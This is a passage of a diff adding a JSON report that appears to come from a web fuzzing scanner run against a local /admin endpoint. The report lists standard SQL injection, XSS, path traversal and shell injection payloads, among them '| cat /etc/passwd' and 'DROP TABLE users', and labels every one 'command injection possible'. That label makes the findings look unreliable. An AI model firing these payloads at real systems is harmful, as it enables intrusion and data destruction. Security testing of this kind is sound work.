+      "payload": "redirect=../../../etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "return=' OR '1'='1",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "return='; DROP TABLE users; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "return=' UNION SELECT * FROM information_schema.tables; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "return=<script>alert('xss')</script>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "return=<img src=x onerror=alert('xss')>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "return=javascript:alert('xss')",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "return=; ls -la",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "return=| cat /etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "return=`whoami`",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "return=../../../etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "next=' OR '1'='1",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "next='; DROP TABLE users; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "next=' UNION SELECT * FROM information_schema.tables; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "next=<script>alert('xss')</script>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "next=<img src=x onerror=alert('xss')>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "next=javascript:alert('xss')",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "next=; ls -la",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "next=| cat /etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "next=`whoami`",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "next=../../../etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "page=' OR '1'='1",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "page='; DROP TABLE users; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "page=' UNION SELECT * FROM information_schema.tables; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "page=<script>alert('xss')</script>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "page=<img src=x onerror=alert('xss')>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "page=javascript:alert('xss')",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "page=; ls -la",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "page=| cat /etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "page=`whoami`",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "page=../../../etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "limit=' OR '1'='1",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "limit='; DROP TABLE users; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "limit=' UNION SELECT * FROM information_schema.tables; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "limit=<script>alert('xss')</script>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "limit=<img src=x onerror=alert('xss')>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "limit=javascript:alert('xss')",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "limit=; ls -la",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "limit=| cat /etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "limit=`whoami`",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "limit=../../../etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "offset=' OR '1'='1",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "offset='; DROP TABLE users; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "offset=' UNION SELECT * FROM information_schema.tables; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "offset=<script>alert('xss')</script>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "offset=<img src=x onerror=alert('xss')>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "offset=javascript:alert('xss')",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "offset=; ls -la",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "offset=| cat /etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "offset=`whoami`",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "offset=../../../etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "sort=' OR '1'='1",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "sort='; DROP TABLE users; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "sort=' UNION SELECT * FROM information_schema.tables; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "sort=<script>alert('xss')</script>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "sort=<img src=x onerror=alert('xss')>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "sort=javascript:alert('xss')",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "sort=; ls -la",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "sort=| cat /etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "sort=`whoami`",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "sort=../../../etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "order=' OR '1'='1",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "order='; DROP TABLE users; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "order=' UNION SELECT * FROM information_schema.tables; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "order=<script>alert('xss')</script>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "order=<img src=x onerror=alert('xss')>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "order=javascript:alert('xss')",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "order=; ls -la",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "order=| cat /etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "order=`whoami`",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "order=../../../etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "filter=' OR '1'='1",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "filter='; DROP TABLE users; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "filter=' UNION SELECT * FROM information_schema.tables; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "filter=<script>alert('xss')</script>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "filter=<img src=x onerror=alert('xss')>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "filter=javascript:alert('xss')",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "filter=; ls -la",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "filter=| cat /etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "filter=`whoami`",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "filter=../../../etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "category=' OR '1'='1",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "category='; DROP TABLE users; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "category=' UNION SELECT * FROM information_schema.tables; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "category=<script>alert('xss')</script>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "category=<img src=x onerror=alert('xss')>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "category=javascript:alert('xss')",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "category=; ls -la",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "category=| cat /etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "category=`whoami`",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "category=../../../etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "type=' OR '1'='1",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "type='; DROP TABLE users; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "type=' UNION SELECT * FROM information_schema.tables; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "type=<script>alert('xss')</script>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "type=<img src=x onerror=alert('xss')>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "type=javascript:alert('xss')",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "type=; ls -la",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "type=| cat /etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "type=`whoami`",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "type=../../../etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "action=' OR '1'='1",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "action='; DROP TABLE users; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "action=' UNION SELECT * FROM information_schema.tables; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "action=<script>alert('xss')</script>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "action=<img src=x onerror=alert('xss')>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "action=javascript:alert('xss')",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "action=; ls -la",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "action=| cat /etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "action=`whoami`",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "action=../../../etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "cmd=' OR '1'='1",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "cmd='; DROP TABLE users; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "cmd=' UNION SELECT * FROM information_schema.tables; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "cmd=<script>alert('xss')</script>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "cmd=<img src=x onerror=alert('xss')>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "cmd=javascript:alert('xss')",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "cmd=; ls -la",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "cmd=| cat /etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "cmd=`whoami`",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "cmd=../../../etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "command=' OR '1'='1",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "command='; DROP TABLE users; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "command=' UNION SELECT * FROM information_schema.tables; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "command=<script>alert('xss')</script>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "command=<img src=x onerror=alert('xss')>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "command=javascript:alert('xss')",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "command=; ls -la",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "command=| cat /etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "command=`whoami`",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "command=../../../etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "exec=' OR '1'='1",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "exec='; DROP TABLE users; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
